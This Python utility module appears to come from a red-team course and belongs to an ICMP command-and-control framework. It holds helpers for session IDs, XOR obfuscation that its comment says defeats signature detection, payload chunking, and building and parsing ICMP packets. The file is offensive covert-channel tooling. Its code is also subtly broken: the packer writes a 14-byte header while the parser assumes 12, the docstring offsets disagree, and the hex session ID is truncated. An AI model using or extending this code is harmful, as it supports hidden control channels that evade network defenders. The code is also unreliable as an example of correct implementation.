# c2_frameworks/icmp/utils.py
"""
ICMP C2 Utilities
- Base64 → raw bytes → chunked into ICMP payloads
- Session tracking
- Sequence number handling
- XOR encryption (optional but recommended)
"""

import struct
import binascii
import secrets
from typing import List, Tuple

# ICMP Echo Request = 8, Echo Reply = 0
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0

def generate_session_id() -> str:
    """16-char hex session ID"""
    return secrets.token_hex(8)

def xor_data(data: bytes, key: bytes = b"30DaysRedTeam") -> bytes:
    """Simple repeating XOR – defeats basic signature detection"""
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))

def chunk_payload(payload: bytes, max_chunk: int = 1400) -> List[bytes]:
    """
    Split payload into chunks that fit in ICMP data field
    1500 MTU - 20 IP - 8 ICMP header = ~1472 safe
    We use 1400 to be extra safe
    """
    chunks = []
    for i in range(0, len(payload), max_chunk):
        chunks.append(payload[i:i + max_chunk])
    return chunks

def build_icmp_packet(
    icmp_type: int,
    seq: int,
    session_id: str,
    chunk_id: int,
    total_chunks: int,
    data: bytes
) -> bytes:
    """
    Custom ICMP packet format:
    Bytes 0-8   : session_id (8 bytes hex)
    Bytes 8-10  : chunk_id (2 bytes) + total_chunks (2 bytes)
    Bytes 10-12 : flags + reserved
    Bytes 12+   : encrypted payload
    """
    header = struct.pack(
        "!8sHHH",                     # Format: session_id, chunk_id, total_chunks, reserved
        session_id.encode(),
        chunk_id,
        total_chunks,
        0
    )
    packet_data = header + data
    # Pad to minimum 16 bytes
    if len(packet_data) < 16:
        packet_data += b"\x00" * (16 - len(packet_data))
    return packet_data

def parse_icmp_packet(data: bytes) -> Tuple[str, int, int, bytes]:
    """
    Extract session, chunk info, and payload from raw ICMP data
    """
    if len(data) < 12:
        raise ValueError("ICMP payload too short")
    
    session_id = data[0:8].decode(errors="ignore").strip("\x00")
    chunk_id = struct.unpack("!H", data[8:10])[0]
    total_chunks = struct.unpack("!H", data[10:12])[0]
    payload = data[12:]
    
    return session_id, chunk_id, total_chunks, payload